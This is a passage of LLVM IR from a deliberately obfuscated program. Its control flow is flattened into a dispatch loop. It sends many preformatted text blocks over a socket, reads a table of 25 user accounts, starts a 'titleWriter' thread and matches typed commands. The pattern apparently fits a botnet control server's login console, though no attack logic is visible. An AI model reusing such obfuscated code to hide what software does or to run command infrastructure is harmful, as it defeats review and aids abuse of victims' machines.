  %1112 = call i32 (i8*, i8*, ...) @sprintf(i8* %1111, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.96, i32 0, i32 0)) #7
  %1113 = getelementptr inbounds [5000 x i8], [5000 x i8]* %73, i32 0, i32 0
  %1114 = call i32 (i8*, i8*, ...) @sprintf(i8* %1113, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.97, i32 0, i32 0)) #7
  %1115 = getelementptr inbounds [5000 x i8], [5000 x i8]* %74, i32 0, i32 0
  %1116 = call i32 (i8*, i8*, ...) @sprintf(i8* %1115, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.98, i32 0, i32 0)) #7
  %1117 = getelementptr inbounds [5000 x i8], [5000 x i8]* %75, i32 0, i32 0
  %1118 = call i32 (i8*, i8*, ...) @sprintf(i8* %1117, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.99, i32 0, i32 0)) #7
  %1119 = getelementptr inbounds [5000 x i8], [5000 x i8]* %76, i32 0, i32 0
  %1120 = call i32 (i8*, i8*, ...) @sprintf(i8* %1119, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.100, i32 0, i32 0)) #7
  %1121 = getelementptr inbounds [5000 x i8], [5000 x i8]* %77, i32 0, i32 0
  %1122 = call i32 (i8*, i8*, ...) @sprintf(i8* %1121, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.101, i32 0, i32 0)) #7
  %1123 = getelementptr inbounds [5000 x i8], [5000 x i8]* %78, i32 0, i32 0
  %1124 = call i32 (i8*, i8*, ...) @sprintf(i8* %1123, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.102, i32 0, i32 0)) #7
  %1125 = getelementptr inbounds [5000 x i8], [5000 x i8]* %79, i32 0, i32 0
  %1126 = call i32 (i8*, i8*, ...) @sprintf(i8* %1125, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %1127 = getelementptr inbounds [5000 x i8], [5000 x i8]* %80, i32 0, i32 0
  %1128 = call i32 (i8*, i8*, ...) @sprintf(i8* %1127, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.103, i32 0, i32 0)) #7
  %1129 = getelementptr inbounds [5000 x i8], [5000 x i8]* %81, i32 0, i32 0
  %1130 = call i32 (i8*, i8*, ...) @sprintf(i8* %1129, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.104, i32 0, i32 0)) #7
  %1131 = getelementptr inbounds [5000 x i8], [5000 x i8]* %82, i32 0, i32 0
  %1132 = call i32 (i8*, i8*, ...) @sprintf(i8* %1131, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.105, i32 0, i32 0)) #7
  %1133 = getelementptr inbounds [5000 x i8], [5000 x i8]* %83, i32 0, i32 0
  %1134 = call i32 (i8*, i8*, ...) @sprintf(i8* %1133, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.106, i32 0, i32 0)) #7
  %1135 = getelementptr inbounds [5000 x i8], [5000 x i8]* %84, i32 0, i32 0
  %1136 = call i32 (i8*, i8*, ...) @sprintf(i8* %1135, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.107, i32 0, i32 0)) #7
  %1137 = getelementptr inbounds [5000 x i8], [5000 x i8]* %85, i32 0, i32 0
  %1138 = call i32 (i8*, i8*, ...) @sprintf(i8* %1137, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.108, i32 0, i32 0)) #7
  %1139 = getelementptr inbounds [5000 x i8], [5000 x i8]* %86, i32 0, i32 0
  %1140 = call i32 (i8*, i8*, ...) @sprintf(i8* %1139, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.109, i32 0, i32 0)) #7
  %1141 = getelementptr inbounds [5000 x i8], [5000 x i8]* %87, i32 0, i32 0
  %1142 = call i32 (i8*, i8*, ...) @sprintf(i8* %1141, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.110, i32 0, i32 0)) #7
  %1143 = getelementptr inbounds [5000 x i8], [5000 x i8]* %88, i32 0, i32 0
  %1144 = call i32 (i8*, i8*, ...) @sprintf(i8* %1143, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.111, i32 0, i32 0)) #7
  %1145 = getelementptr inbounds [5000 x i8], [5000 x i8]* %89, i32 0, i32 0
  %1146 = call i32 (i8*, i8*, ...) @sprintf(i8* %1145, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %1147 = load i32, i32* %4, align 4
  %1148 = getelementptr inbounds [5000 x i8], [5000 x i8]* %67, i32 0, i32 0
  %1149 = getelementptr inbounds [5000 x i8], [5000 x i8]* %67, i32 0, i32 0
  %1150 = call i64 @strlen(i8* %1149) #8
  %1151 = call i64 @send(i32 %1147, i8* %1148, i64 %1150, i32 16384)
  %1152 = icmp eq i64 %1151, -1
  %1153 = select i1 %1152, i32 1236850146, i32 2011894538
  store i32 %1153, i32* %switchVar
  br label %loopEnd

; <label>:1154:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1155:                                   ; preds = %loopEntry
  %1156 = load i32, i32* %4, align 4
  %1157 = getelementptr inbounds [5000 x i8], [5000 x i8]* %68, i32 0, i32 0
  %1158 = getelementptr inbounds [5000 x i8], [5000 x i8]* %68, i32 0, i32 0
  %1159 = call i64 @strlen(i8* %1158) #8
  %1160 = call i64 @send(i32 %1156, i8* %1157, i64 %1159, i32 16384)
  %1161 = icmp eq i64 %1160, -1
  %1162 = select i1 %1161, i32 -712053033, i32 -330507517
  store i32 %1162, i32* %switchVar
  br label %loopEnd

; <label>:1163:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1164:                                   ; preds = %loopEntry
  %1165 = load i32, i32* %4, align 4
  %1166 = getelementptr inbounds [5000 x i8], [5000 x i8]* %69, i32 0, i32 0
  %1167 = getelementptr inbounds [5000 x i8], [5000 x i8]* %69, i32 0, i32 0
  %1168 = call i64 @strlen(i8* %1167) #8
  %1169 = call i64 @send(i32 %1165, i8* %1166, i64 %1168, i32 16384)
  %1170 = icmp eq i64 %1169, -1
  %1171 = select i1 %1170, i32 -1259939936, i32 1731710144
  store i32 %1171, i32* %switchVar
  br label %loopEnd

; <label>:1172:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1173:                                   ; preds = %loopEntry
  %1174 = load i32, i32* %4, align 4
  %1175 = getelementptr inbounds [5000 x i8], [5000 x i8]* %70, i32 0, i32 0
  %1176 = getelementptr inbounds [5000 x i8], [5000 x i8]* %70, i32 0, i32 0
  %1177 = call i64 @strlen(i8* %1176) #8
  %1178 = call i64 @send(i32 %1174, i8* %1175, i64 %1177, i32 16384)
  %1179 = icmp eq i64 %1178, -1
  %1180 = select i1 %1179, i32 635437299, i32 1307065746
  store i32 %1180, i32* %switchVar
  br label %loopEnd

; <label>:1181:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1182:                                   ; preds = %loopEntry
  %1183 = load i32, i32* %4, align 4
  %1184 = getelementptr inbounds [5000 x i8], [5000 x i8]* %71, i32 0, i32 0
  %1185 = getelementptr inbounds [5000 x i8], [5000 x i8]* %71, i32 0, i32 0
  %1186 = call i64 @strlen(i8* %1185) #8
  %1187 = call i64 @send(i32 %1183, i8* %1184, i64 %1186, i32 16384)
  %1188 = icmp eq i64 %1187, -1
  %1189 = select i1 %1188, i32 -744001301, i32 36900630
  store i32 %1189, i32* %switchVar
  br label %loopEnd

; <label>:1190:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1191:                                   ; preds = %loopEntry
  %1192 = load i32, i32* %4, align 4
  %1193 = getelementptr inbounds [5000 x i8], [5000 x i8]* %72, i32 0, i32 0
  %1194 = getelementptr inbounds [5000 x i8], [5000 x i8]* %72, i32 0, i32 0
  %1195 = call i64 @strlen(i8* %1194) #8
  %1196 = call i64 @send(i32 %1192, i8* %1193, i64 %1195, i32 16384)
  %1197 = icmp eq i64 %1196, -1
  %1198 = select i1 %1197, i32 1918692499, i32 1696339931
  store i32 %1198, i32* %switchVar
  br label %loopEnd

; <label>:1199:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1200:                                   ; preds = %loopEntry
  %1201 = load i32, i32* %4, align 4
  %1202 = getelementptr inbounds [5000 x i8], [5000 x i8]* %73, i32 0, i32 0
  %1203 = getelementptr inbounds [5000 x i8], [5000 x i8]* %73, i32 0, i32 0
  %1204 = call i64 @strlen(i8* %1203) #8
  %1205 = call i64 @send(i32 %1201, i8* %1202, i64 %1204, i32 16384)
  %1206 = icmp eq i64 %1205, -1
  %1207 = select i1 %1206, i32 316279665, i32 -1210283602
  store i32 %1207, i32* %switchVar
  br label %loopEnd

; <label>:1208:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1209:                                   ; preds = %loopEntry
  %1210 = load i32, i32* %4, align 4
  %1211 = getelementptr inbounds [5000 x i8], [5000 x i8]* %74, i32 0, i32 0
  %1212 = getelementptr inbounds [5000 x i8], [5000 x i8]* %74, i32 0, i32 0
  %1213 = call i64 @strlen(i8* %1212) #8
  %1214 = call i64 @send(i32 %1210, i8* %1211, i64 %1213, i32 16384)
  %1215 = icmp eq i64 %1214, -1
  %1216 = select i1 %1215, i32 780876105, i32 1680619402
  store i32 %1216, i32* %switchVar
  br label %loopEnd

; <label>:1217:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1218:                                   ; preds = %loopEntry
  %1219 = load i32, i32* %4, align 4
  %1220 = getelementptr inbounds [5000 x i8], [5000 x i8]* %75, i32 0, i32 0
  %1221 = getelementptr inbounds [5000 x i8], [5000 x i8]* %75, i32 0, i32 0
  %1222 = call i64 @strlen(i8* %1221) #8
  %1223 = call i64 @send(i32 %1219, i8* %1220, i64 %1222, i32 16384)
  %1224 = icmp eq i64 %1223, -1
  %1225 = select i1 %1224, i32 -1138194821, i32 2050326589
  store i32 %1225, i32* %switchVar
  br label %loopEnd

; <label>:1226:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1227:                                   ; preds = %loopEntry
  %1228 = load i32, i32* %4, align 4
  %1229 = getelementptr inbounds [5000 x i8], [5000 x i8]* %76, i32 0, i32 0
  %1230 = getelementptr inbounds [5000 x i8], [5000 x i8]* %76, i32 0, i32 0
  %1231 = call i64 @strlen(i8* %1230) #8
  %1232 = call i64 @send(i32 %1228, i8* %1229, i64 %1231, i32 16384)
  %1233 = icmp eq i64 %1232, -1
  %1234 = select i1 %1233, i32 2013700287, i32 1459985899
  store i32 %1234, i32* %switchVar
  br label %loopEnd

; <label>:1235:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1236:                                   ; preds = %loopEntry
  %1237 = load i32, i32* %4, align 4
  %1238 = getelementptr inbounds [5000 x i8], [5000 x i8]* %77, i32 0, i32 0
  %1239 = getelementptr inbounds [5000 x i8], [5000 x i8]* %77, i32 0, i32 0
  %1240 = call i64 @strlen(i8* %1239) #8
  %1241 = call i64 @send(i32 %1237, i8* %1238, i64 %1240, i32 16384)
  %1242 = icmp eq i64 %1241, -1
  %1243 = select i1 %1242, i32 -245225138, i32 -828071792
  store i32 %1243, i32* %switchVar
  br label %loopEnd

; <label>:1244:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1245:                                   ; preds = %loopEntry
  %1246 = load i32, i32* %4, align 4
  %1247 = getelementptr inbounds [5000 x i8], [5000 x i8]* %78, i32 0, i32 0
  %1248 = getelementptr inbounds [5000 x i8], [5000 x i8]* %78, i32 0, i32 0
  %1249 = call i64 @strlen(i8* %1248) #8
  %1250 = call i64 @send(i32 %1246, i8* %1247, i64 %1249, i32 16384)
  %1251 = icmp eq i64 %1250, -1
  %1252 = select i1 %1251, i32 1978461945, i32 1011016955
  store i32 %1252, i32* %switchVar
  br label %loopEnd

; <label>:1253:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1254:                                   ; preds = %loopEntry
  %1255 = load i32, i32* %4, align 4
  %1256 = getelementptr inbounds [5000 x i8], [5000 x i8]* %79, i32 0, i32 0
  %1257 = getelementptr inbounds [5000 x i8], [5000 x i8]* %79, i32 0, i32 0
  %1258 = call i64 @strlen(i8* %1257) #8
  %1259 = call i64 @send(i32 %1255, i8* %1256, i64 %1258, i32 16384)
  %1260 = icmp eq i64 %1259, -1
  %1261 = select i1 %1260, i32 273691829, i32 328917562
  store i32 %1261, i32* %switchVar
  br label %loopEnd

; <label>:1262:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1263:                                   ; preds = %loopEntry
  %1264 = load i32, i32* %4, align 4
  %1265 = getelementptr inbounds [5000 x i8], [5000 x i8]* %80, i32 0, i32 0
  %1266 = getelementptr inbounds [5000 x i8], [5000 x i8]* %80, i32 0, i32 0
  %1267 = call i64 @strlen(i8* %1266) #8
  %1268 = call i64 @send(i32 %1264, i8* %1265, i64 %1267, i32 16384)
  %1269 = icmp eq i64 %1268, -1
  %1270 = select i1 %1269, i32 -1365104454, i32 439475999
  store i32 %1270, i32* %switchVar
  br label %loopEnd

; <label>:1271:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1272:                                   ; preds = %loopEntry
  %1273 = load i32, i32* %4, align 4
  %1274 = getelementptr inbounds [5000 x i8], [5000 x i8]* %81, i32 0, i32 0
  %1275 = getelementptr inbounds [5000 x i8], [5000 x i8]* %81, i32 0, i32 0
  %1276 = call i64 @strlen(i8* %1275) #8
  %1277 = call i64 @send(i32 %1273, i8* %1274, i64 %1276, i32 16384)
  %1278 = icmp eq i64 %1277, -1
  %1279 = select i1 %1278, i32 1854500319, i32 -75394967
  store i32 %1279, i32* %switchVar
  br label %loopEnd

; <label>:1280:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1281:                                   ; preds = %loopEntry
  %1282 = load i32, i32* %4, align 4
  %1283 = getelementptr inbounds [5000 x i8], [5000 x i8]* %82, i32 0, i32 0
  %1284 = getelementptr inbounds [5000 x i8], [5000 x i8]* %82, i32 0, i32 0
  %1285 = call i64 @strlen(i8* %1284) #8
  %1286 = call i64 @send(i32 %1282, i8* %1283, i64 %1285, i32 16384)
  %1287 = icmp eq i64 %1286, -1
  %1288 = select i1 %1287, i32 -810940481, i32 -1534451430
  store i32 %1288, i32* %switchVar
  br label %loopEnd

; <label>:1289:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1290:                                   ; preds = %loopEntry
  %1291 = load i32, i32* %4, align 4
  %1292 = getelementptr inbounds [5000 x i8], [5000 x i8]* %83, i32 0, i32 0
  %1293 = getelementptr inbounds [5000 x i8], [5000 x i8]* %83, i32 0, i32 0
  %1294 = call i64 @strlen(i8* %1293) #8
  %1295 = call i64 @send(i32 %1291, i8* %1292, i64 %1294, i32 16384)
  %1296 = icmp eq i64 %1295, -1
  %1297 = select i1 %1296, i32 586642484, i32 -755911887
  store i32 %1297, i32* %switchVar
  br label %loopEnd

; <label>:1298:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1299:                                   ; preds = %loopEntry
  %1300 = load i32, i32* %4, align 4
  %1301 = getelementptr inbounds [5000 x i8], [5000 x i8]* %84, i32 0, i32 0
  %1302 = getelementptr inbounds [5000 x i8], [5000 x i8]* %84, i32 0, i32 0
  %1303 = call i64 @strlen(i8* %1302) #8
  %1304 = call i64 @send(i32 %1300, i8* %1301, i64 %1303, i32 16384)
  %1305 = icmp eq i64 %1304, -1
  %1306 = select i1 %1305, i32 -216957403, i32 1441109186
  store i32 %1306, i32* %switchVar
  br label %loopEnd

; <label>:1307:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1308:                                   ; preds = %loopEntry
  %1309 = load i32, i32* %4, align 4
  %1310 = getelementptr inbounds [5000 x i8], [5000 x i8]* %85, i32 0, i32 0
  %1311 = getelementptr inbounds [5000 x i8], [5000 x i8]* %85, i32 0, i32 0
  %1312 = call i64 @strlen(i8* %1311) #8
  %1313 = call i64 @send(i32 %1309, i8* %1310, i64 %1312, i32 16384)
  %1314 = icmp eq i64 %1313, -1
  %1315 = select i1 %1314, i32 -1490751895, i32 606162654
  store i32 %1315, i32* %switchVar
  br label %loopEnd

; <label>:1316:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1317:                                   ; preds = %loopEntry
  %1318 = load i32, i32* %4, align 4
  %1319 = getelementptr inbounds [5000 x i8], [5000 x i8]* %86, i32 0, i32 0
  %1320 = getelementptr inbounds [5000 x i8], [5000 x i8]* %86, i32 0, i32 0
  %1321 = call i64 @strlen(i8* %1320) #8
  %1322 = call i64 @send(i32 %1318, i8* %1319, i64 %1321, i32 16384)
  %1323 = icmp eq i64 %1322, -1
  %1324 = select i1 %1323, i32 554054150, i32 -128506949
  store i32 %1324, i32* %switchVar
  br label %loopEnd

; <label>:1325:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1326:                                   ; preds = %loopEntry
  %1327 = load i32, i32* %4, align 4
  %1328 = getelementptr inbounds [5000 x i8], [5000 x i8]* %87, i32 0, i32 0
  %1329 = getelementptr inbounds [5000 x i8], [5000 x i8]* %87, i32 0, i32 0
  %1330 = call i64 @strlen(i8* %1329) #8
  %1331 = call i64 @send(i32 %1327, i8* %1328, i64 %1330, i32 16384)
  %1332 = icmp eq i64 %1331, -1
  %1333 = select i1 %1332, i32 1736802433, i32 1368964142
  store i32 %1333, i32* %switchVar
  br label %loopEnd

; <label>:1334:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1335:                                   ; preds = %loopEntry
  %1336 = load i32, i32* %4, align 4
  %1337 = getelementptr inbounds [5000 x i8], [5000 x i8]* %88, i32 0, i32 0
  %1338 = getelementptr inbounds [5000 x i8], [5000 x i8]* %88, i32 0, i32 0
  %1339 = call i64 @strlen(i8* %1338) #8
  %1340 = call i64 @send(i32 %1336, i8* %1337, i64 %1339, i32 16384)
  %1341 = icmp eq i64 %1340, -1
  %1342 = select i1 %1341, i32 487635488, i32 1711858934
  store i32 %1342, i32* %switchVar
  br label %loopEnd

; <label>:1343:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1344:                                   ; preds = %loopEntry
  %1345 = load i32, i32* %4, align 4
  %1346 = getelementptr inbounds [5000 x i8], [5000 x i8]* %89, i32 0, i32 0
  %1347 = getelementptr inbounds [5000 x i8], [5000 x i8]* %89, i32 0, i32 0
  %1348 = call i64 @strlen(i8* %1347) #8
  %1349 = call i64 @send(i32 %1345, i8* %1346, i64 %1348, i32 16384)
  %1350 = icmp eq i64 %1349, -1
  %1351 = select i1 %1350, i32 -1335029558, i32 -744289458
  store i32 %1351, i32* %switchVar
  br label %loopEnd

; <label>:1352:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1353:                                   ; preds = %loopEntry
  %1354 = load i8*, i8** %3, align 8
  %1355 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1354) #7
  store i32 298290902, i32* %switchVar
  br label %loopEnd

; <label>:1356:                                   ; preds = %loopEntry
  %1357 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1358 = load i32, i32* %5, align 4
  %1359 = sext i32 %1358 to i64
  %1360 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1359
  %1361 = getelementptr inbounds %struct.account, %struct.account* %1360, i32 0, i32 0
  %1362 = getelementptr inbounds [20 x i8], [20 x i8]* %1361, i32 0, i32 0
  %1363 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1364 = call i32 (i8*, i8*, ...) @sprintf(i8* %1357, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %1362, i8* %1363) #7
  %1365 = load i32, i32* %4, align 4
  %1366 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1367 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1368 = call i64 @strlen(i8* %1367) #8
  %1369 = call i64 @send(i32 %1365, i8* %1366, i64 %1368, i32 16384)
  %1370 = icmp eq i64 %1369, -1
  %1371 = select i1 %1370, i32 -1293203683, i32 -17872267
  store i32 %1371, i32* %switchVar
  br label %loopEnd

; <label>:1372:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1373:                                   ; preds = %loopEntry
  store i32 -391126925, i32* %switchVar
  br label %loopEnd

; <label>:1374:                                   ; preds = %loopEntry
  store i32 473462240, i32* %switchVar
  br label %loopEnd

; <label>:1375:                                   ; preds = %loopEntry
  %1376 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1377 = call i8* @strstr(i8* %1376, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.112, i32 0, i32 0)) #8
  %1378 = icmp ne i8* %1377, null
  %1379 = select i1 %1378, i32 -1352288436, i32 -725065046
  store i32 %1379, i32* %switchVar
  br label %loopEnd

; <label>:1380:                                   ; preds = %loopEntry
  %1381 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1382 = call i8* @strstr(i8* %1381, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.113, i32 0, i32 0)) #8
  %1383 = icmp ne i8* %1382, null
  %1384 = select i1 %1383, i32 -1352288436, i32 1998072201
  store i32 %1384, i32* %switchVar
  br label %loopEnd

; <label>:1385:                                   ; preds = %loopEntry
  %1386 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1387 = call i8* @strstr(i8* %1386, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.15, i32 0, i32 0)) #8
  %1388 = icmp ne i8* %1387, null
  %1389 = select i1 %1388, i32 -1352288436, i32 1492876316
  store i32 %1389, i32* %switchVar
  br label %loopEnd

; <label>:1390:                                   ; preds = %loopEntry
  %1391 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1392 = call i8* @strstr(i8* %1391, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.114, i32 0, i32 0)) #8
  %1393 = icmp ne i8* %1392, null
  %1394 = select i1 %1393, i32 -1352288436, i32 458685786
  store i32 %1394, i32* %switchVar
  br label %loopEnd

; <label>:1395:                                   ; preds = %loopEntry
  %1396 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1397 = call i8* @strstr(i8* %1396, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.115, i32 0, i32 0)) #8
  %1398 = icmp ne i8* %1397, null
  %1399 = select i1 %1398, i32 -1352288436, i32 696369707
  store i32 %1399, i32* %switchVar
  br label %loopEnd

; <label>:1400:                                   ; preds = %loopEntry
  %1401 = load i8*, i8** %3, align 8
  %1402 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1401) #7
  %1403 = getelementptr inbounds [5000 x i8], [5000 x i8]* %90, i32 0, i32 0
  %1404 = call i32 (i8*, i8*, ...) @sprintf(i8* %1403, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.116, i32 0, i32 0)) #7
  %1405 = getelementptr inbounds [5000 x i8], [5000 x i8]* %91, i32 0, i32 0
  %1406 = call i32 (i8*, i8*, ...) @sprintf(i8* %1405, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %1407 = getelementptr inbounds [5000 x i8], [5000 x i8]* %92, i32 0, i32 0
  %1408 = call i32 (i8*, i8*, ...) @sprintf(i8* %1407, i8* getelementptr inbounds ([95 x i8], [95 x i8]* @.str.117, i32 0, i32 0)) #7
  %1409 = getelementptr inbounds [5000 x i8], [5000 x i8]* %93, i32 0, i32 0
  %1410 = call i32 (i8*, i8*, ...) @sprintf(i8* %1409, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.118, i32 0, i32 0)) #7
  %1411 = getelementptr inbounds [5000 x i8], [5000 x i8]* %94, i32 0, i32 0
  %1412 = call i32 (i8*, i8*, ...) @sprintf(i8* %1411, i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.119, i32 0, i32 0)) #7
  %1413 = getelementptr inbounds [5000 x i8], [5000 x i8]* %95, i32 0, i32 0
  %1414 = call i32 (i8*, i8*, ...) @sprintf(i8* %1413, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.120, i32 0, i32 0)) #7
  %1415 = getelementptr inbounds [5000 x i8], [5000 x i8]* %96, i32 0, i32 0
  %1416 = call i32 (i8*, i8*, ...) @sprintf(i8* %1415, i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.121, i32 0, i32 0)) #7
  %1417 = getelementptr inbounds [5000 x i8], [5000 x i8]* %97, i32 0, i32 0
  %1418 = call i32 (i8*, i8*, ...) @sprintf(i8* %1417, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %1419 = load i32, i32* %4, align 4
  %1420 = getelementptr inbounds [5000 x i8], [5000 x i8]* %90, i32 0, i32 0
  %1421 = getelementptr inbounds [5000 x i8], [5000 x i8]* %90, i32 0, i32 0
  %1422 = call i64 @strlen(i8* %1421) #8
  %1423 = call i64 @send(i32 %1419, i8* %1420, i64 %1422, i32 16384)
  %1424 = icmp eq i64 %1423, -1
  %1425 = select i1 %1424, i32 245350618, i32 -1698302246
  store i32 %1425, i32* %switchVar
  br label %loopEnd

; <label>:1426:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1427:                                   ; preds = %loopEntry
  %1428 = load i32, i32* %4, align 4
  %1429 = getelementptr inbounds [5000 x i8], [5000 x i8]* %91, i32 0, i32 0
  %1430 = getelementptr inbounds [5000 x i8], [5000 x i8]* %91, i32 0, i32 0
  %1431 = call i64 @strlen(i8* %1430) #8
  %1432 = call i64 @send(i32 %1428, i8* %1429, i64 %1431, i32 16384)
  %1433 = icmp eq i64 %1432, -1
  %1434 = select i1 %1433, i32 965826971, i32 -1037061500
  store i32 %1434, i32* %switchVar
  br label %loopEnd

; <label>:1435:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1436:                                   ; preds = %loopEntry
  %1437 = load i32, i32* %4, align 4
  %1438 = getelementptr inbounds [5000 x i8], [5000 x i8]* %92, i32 0, i32 0
  %1439 = getelementptr inbounds [5000 x i8], [5000 x i8]* %92, i32 0, i32 0
  %1440 = call i64 @strlen(i8* %1439) #8
  %1441 = call i64 @send(i32 %1437, i8* %1438, i64 %1440, i32 16384)
  %1442 = icmp eq i64 %1441, -1
  %1443 = select i1 %1442, i32 1131817901, i32 835859996
  store i32 %1443, i32* %switchVar
  br label %loopEnd

; <label>:1444:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1445:                                   ; preds = %loopEntry
  %1446 = load i32, i32* %4, align 4
  %1447 = getelementptr inbounds [5000 x i8], [5000 x i8]* %93, i32 0, i32 0
  %1448 = getelementptr inbounds [5000 x i8], [5000 x i8]* %93, i32 0, i32 0
  %1449 = call i64 @strlen(i8* %1448) #8
  %1450 = call i64 @send(i32 %1446, i8* %1447, i64 %1449, i32 16384)
  %1451 = icmp eq i64 %1450, -1
  %1452 = select i1 %1451, i32 -1213561868, i32 -742168236
  store i32 %1452, i32* %switchVar
  br label %loopEnd

; <label>:1453:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1454:                                   ; preds = %loopEntry
  %1455 = load i32, i32* %4, align 4
  %1456 = getelementptr inbounds [5000 x i8], [5000 x i8]* %94, i32 0, i32 0
  %1457 = getelementptr inbounds [5000 x i8], [5000 x i8]* %94, i32 0, i32 0
  %1458 = call i64 @strlen(i8* %1457) #8
  %1459 = call i64 @send(i32 %1455, i8* %1456, i64 %1458, i32 16384)
  %1460 = icmp eq i64 %1459, -1
  %1461 = select i1 %1460, i32 -1018441933, i32 735152139
  store i32 %1461, i32* %switchVar
  br label %loopEnd

; <label>:1462:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1463:                                   ; preds = %loopEntry
  %1464 = load i32, i32* %4, align 4
  %1465 = getelementptr inbounds [5000 x i8], [5000 x i8]* %95, i32 0, i32 0
  %1466 = getelementptr inbounds [5000 x i8], [5000 x i8]* %95, i32 0, i32 0
  %1467 = call i64 @strlen(i8* %1466) #8
  %1468 = call i64 @send(i32 %1464, i8* %1465, i64 %1467, i32 16384)
  %1469 = icmp eq i64 %1468, -1
  %1470 = select i1 %1469, i32 -1825503055, i32 -1703160094
  store i32 %1470, i32* %switchVar
  br label %loopEnd

; <label>:1471:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1472:                                   ; preds = %loopEntry
  %1473 = load i32, i32* %4, align 4
